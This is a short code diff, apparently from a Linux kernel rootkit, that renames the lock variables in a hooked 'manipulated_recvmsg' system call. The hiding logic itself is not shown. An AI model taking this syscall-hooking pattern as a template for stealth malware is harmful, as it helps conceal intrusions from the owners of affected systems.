@@ -141,7 +141,7 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
 asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags)
 {
 	/* lock and increase the call counter */
-	INCREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_show_lock, recvmsg_show_lock_flags);
+	INCREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock, recvmsg_lock_flags);
 
 	long ret;
 	long count;
@@ -185,7 +185,7 @@ asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags
 	}
 
 	/* lock and increase the call counter */
-	DECREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_show_lock, recvmsg_show_lock_flags);
+	DECREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock, recvmsg_lock_flags);
 	return ret;
 }
 
